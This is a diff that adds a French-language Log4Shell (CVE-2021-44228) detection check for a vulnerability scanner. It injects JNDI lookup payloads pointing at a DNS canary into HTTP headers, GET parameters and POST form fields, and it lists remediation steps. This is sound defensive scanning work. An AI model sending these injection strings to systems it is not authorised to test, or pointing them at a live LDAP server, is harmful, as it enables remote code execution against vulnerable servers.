@@ -1,0 +1,60 @@
+id: log4shell
+name: Log4JChecker
+version: 2.0.0
+author: OpenCVEC
+cves: [CVE-2021-44228, CVE-2021-45046]
+product: Apache Log4j 2 (2.0-beta9 à 2.15.0)
+description: >-
+  Place une chaîne de lookup JNDI pointant vers le canari dans les en-têtes, les paramètres et
+  un formulaire. Une application qui journalise ces valeurs avec une version vulnérable de Log4j
+  résout le nom du canari.
+mode: canary
+proof: Requête DNS sur le canari (lookup JNDI)
+sent: >-
+  ${jndi:ldap://<point>.<canari>/a} : le nom est résolu, mais le récepteur n'expose aucun service
+  LDAP, donc aucune classe Java n'est chargée ni exécutée.
+remediation:
+  - Mettre Log4j à jour en 2.17.1 ou plus (2.12.4 pour Java 7, 2.3.2 pour Java 6).
+  - Bloquer les sorties LDAP, RMI et DNS non nécessaires depuis ce serveur.
+  - Rechercher des traces d'exploitation antérieure (chaînes ${jndi:} dans les journaux).
+  - Relancer le check pour confirmer la correction.
+references:
+  - https://logging.apache.org/log4j/2.x/security.html
+  - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+tags: [java, log4j]
+lab_validated: false
+lab_note: À revalider après migration en plugin.
+steps:
+  - id: get
+    http:
+      method: GET
+      path: "{{target.path}}?q=%24%7Bjndi%3Aldap%3A%2F%2F{{canary.dns.p7}}%2Fa%7D&action=%24%7Bjndi%3Aldap%3A%2F%2F{{canary.dns.p8}}%2Fa%7D&id=%24%7Bjndi%3Aldap%3A%2F%2F{{canary.dns.p9}}%2Fa%7D&search=%24%7Bjndi%3Aldap%3A%2F%2F{{canary.dns.p10}}%2Fa%7D"
+      headers:
+        User-Agent: "${jndi:ldap://{{canary.dns.p1}}/a}"
+        X-Api-Version: "${jndi:ldap://{{canary.dns.p2}}/a}"
+        Referer: "${jndi:ldap://{{canary.dns.p3}}/a}"
+        X-Forwarded-For: "${jndi:ldap://{{canary.dns.p4}}/a}"
+        Authorization: "Bearer ${jndi:ldap://{{canary.dns.p5}}/a}"
+        X-Request-Id: "${jndi:ldap://{{canary.dns.p6}}/a}"
+    points:
+      p1: en-tête User-Agent
+      p2: en-tête X-Api-Version
+      p3: en-tête Referer
+      p4: en-tête X-Forwarded-For
+      p5: en-tête Authorization
+      p6: en-tête X-Request-Id
+      p7: paramètre GET q
+      p8: paramètre GET action
+      p9: paramètre GET id
+      p10: paramètre GET search
+  - id: form
+    http:
+      method: POST
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: "username=%24%7Bjndi%3Aldap%3A%2F%2F{{canary.dns.p11}}%2Fa%7D&search=%24%7Bjndi%3Aldap%3A%2F%2F{{canary.dns.p12}}%2Fa%7D"
+    points:
+      p11: champ POST username
+      p12: champ POST search
+proofs:
+  callback: true
